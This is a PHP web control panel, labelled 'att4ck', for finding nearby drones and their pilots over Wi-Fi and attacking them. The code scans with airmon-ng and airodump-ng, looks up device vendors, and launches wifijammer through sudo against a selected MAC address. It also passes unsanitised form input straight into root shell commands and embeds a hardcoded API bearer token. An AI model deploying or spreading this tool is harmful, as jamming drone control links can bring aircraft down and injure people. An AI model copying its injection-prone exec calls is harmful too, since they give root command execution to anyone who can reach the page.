<?php 
session_start();

if(isset($_SESSION["wlan"]))
{
	$wwlan = $_SESSION["wlan"];
}
else
{
	$wwlan = "Nessuna";
}

?>
<html>
<head>
  <title>att4ck</title>
</head>
<body>
	<center><img src="images/droneini.jpeg" alt="att4ck 1.0" width="250" height="250"> </center>

<form method="post">
  <table
 style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
  <tbody>
  <tr>
	<td style="text-align: center;"><button name="mode">Avvia il Monitor Mode [<?php echo $wwlan?>]</button></td>
	<td style="text-align: center;"><button name="reset">Reset Moduli</button></td>
  </tr>
	<tr>
    <td style="text-align: center;"><button name="start">Avvia Ricerca Drone</button></td>
    <td style="text-align: center;"><button name="reboot">Riavvia Att4ck</button></td>
	</tr>
	<tr>
    <td style="text-align: center;"><button name="deuth">Attaca Drone/Pilota</button></td>
  </tr>
 </tbody>
  </table>
</form>
</body>
</html>

<?php 

if (isset($_POST['reset']))
{
  session_destroy();
header('Refresh: 3; url=index.php');

}
else if (isset($_POST['reboot']))
{
  session_destroy();
  exec("sudo reboot", $output, $code);

}

else if (isset($_POST['mode']))
{
	exec("sudo airmon-ng | grep -Eo 'wlan[0-9]'", $output, $code);
	switch($code) {
    case 0:
    
    
    if($output>0) :
    
    ?>

<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
	<form method="post">

	    <tr>
        <th>Nome scheda</th>
    </tr>
    
    <?php foreach ($output as $row): ?>
    

<tr>
		<td style="text-align: center;"><button name="wlan"><?php echo $row;?></button></td>
          <input type="hidden" name="testo" value="<?php echo $row;?>" />
    </tr>
    <?php endforeach;endif; ?>
</table>
    
    <?php 
    
     break;
   }
}
else if(isset($_POST['testo']))
{
	?>
	<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
 	 <tbody>
		 	<tr>
 	<td style="text-align: center;">Hai selezionato l'interfaccia <?php echo $_POST['testo']; ?> ...</td>
		 	</tr>
 <?php
	exec("sudo airmon-ng start ".$_POST['testo']." | grep -Eo 'wlan[0-9]mon'", $output, $code);
	switch($code) {
    case 0: 
?>
<tr>
	 <td style="text-align: center;">L'interfaccia Monitor [<?php echo $output[0];?>] è stata abilitata...</td>
	        </tr>  
	        <tr>
	 <td style="text-align: center;">Avvia la ricerca dei Droni nelle vicinanze!</td>
	        </tr>  
	         </tbody>
     </table>
 
<?php
$_SESSION['wlan'] = $output[0];
header('Refresh: 3; url=index.php');


	    break;
    }
}
else if(isset($_POST['start']))
{
	
if(!isset($_SESSION["wlan"]))
{
?>		 <center><td style="text-align: center;">Avvia, prima, il monitor mode!!!</td></center>
<?php
}
else
{
	exec("sudo timeout 5 airodump-ng -w /var/www/html/my --output-format csv --write-interval 1 wlan1mon",   $output, $code);
     
    if($output>0) :
     exec("sudo /var/www/html/converti",$output,$code);

$mac = array();
$myfile = fopen("/var/www/html/out.csv", "r") or die("Non riesco a vedere nessun drone!");
// Output one character until end-of-file
while(!feof($myfile)) {

		   $mac[] = fgets($myfile); 

}
fclose($myfile);  

for ($i = 0, $n = count($mac) ; $i < $n ; $i++)
	
	{	 
    $findme = 'BSSID';
    $findme2 = 'Station MAC';

    $pos = strpos($mac[$i], $findme);
    $pos2 = strpos($mac[$i], $findme2);

   
  if($pos !== false)  
    {
      unset($mac[$i]);	
      array_splice( $mac , $i, 0, '<img src="images/dronecerca.png" title="Droni" width="50"><br><span style="color:#800000;text-align:center;">Possibili Droni</span>');

	} 
  else if($pos2 !== false)  
 { 
      unset($mac[$i]);	
      array_splice( $mac , $i, 0, '<img src="images/telecomando.png" title="Piloti" width="50"><br><span style="color:#800000;text-align:center;">Possibili Piloti</span>');

}

} 
	
  
  
    ?>

<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
	<form method="post">
    
    <?php foreach ($mac as $row): 
?> 	<tr> <td style="text-align: center;"><?php echo $row ?></td> <?php
	    
  $url = "https://api.macvendors.com/v1/lookup/" . urlencode($row);
  $text = "Accept: text/plain";
  
  $headers = array(
    'Accept: text/plain',
    'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJtYWN2ZW5kb3JzIiwiZXhwIjoxODQ0MDI1MjE1LCJpYXQiOjE1Mjk1MjkyMTUsImlzcyI6Im1hY3ZlbmRvcnMiLCJqdGkiOiI0YTIyY2E2MS0zODRkLTRiODItOTdjOC1kNTdjMmRjOGZlNWEiLCJuYmYiOjE1Mjk1MjkyMTQsInN1YiI6IjQ3MSIsInR5cCI6ImFjY2VzcyJ9.hSFn7bLBCyxlui5_8SqhZe88yIB1bpVDf4vZEUBNLpLXygkW-0Xuyd2AnpOFFn4qFv-pVJAIZRDBPqojquGn7A'
 );
  
    
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $drone = '<span style="color:#0000ff;text-align:center;">' . curl_exec($ch) . '</span>';
        
    $findme = 'errors';
    $pos = strpos($drone, $findme);
   
   
   
  if($pos !== false)
  {
    $drone =  '';//'<span style="color:#ff0000;text-align:center;">MAC non riconosciuto!</span>';
  }
  else
  {
  
	    
    ?>
 	    
	 <td style="text-align: center;"><?php echo $drone ?></td>
     <td style="text-align: center;"><button name="selmac">Seleziona</button></td>
               <input type="hidden" name="selmac" value="<?php echo $row;?>" />

    </tr>
    <?php }endforeach;endif; ?>
</table>
    </form>
    <?php 
    


}
}
else if(isset($_POST['selmac']))
{
	$_SESSION["mac"] = $_POST['selmac'];
	


	?>
	<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
	 
 	 <tbody>
		 	<tr>
 	         <td style="text-align: center;">Hai selezionato: <?php echo $_SESSION["mac"] ?></td>
 	         <td style="text-align: center;">Inizia l'attacco!!</td>
		 	</tr>
	         </tbody>
     </table>
<?php
}
else if(isset($_POST['deuth']))
{
if(!isset($_SESSION["mac"]))
{
?>		 <center><td style="text-align: center;">Avvia, prima, il monitor mode e cerca un Drone/Pilota da attaccare!</td></center>
<?php
}
else
{
exec("cd /var/www/html/wifijammer && sudo python wifijammer -a " . $_SESSION["mac"] . " -i ".$_SESSION["wlan"]. " -t .00001", $output, $code);
	}
}
?>
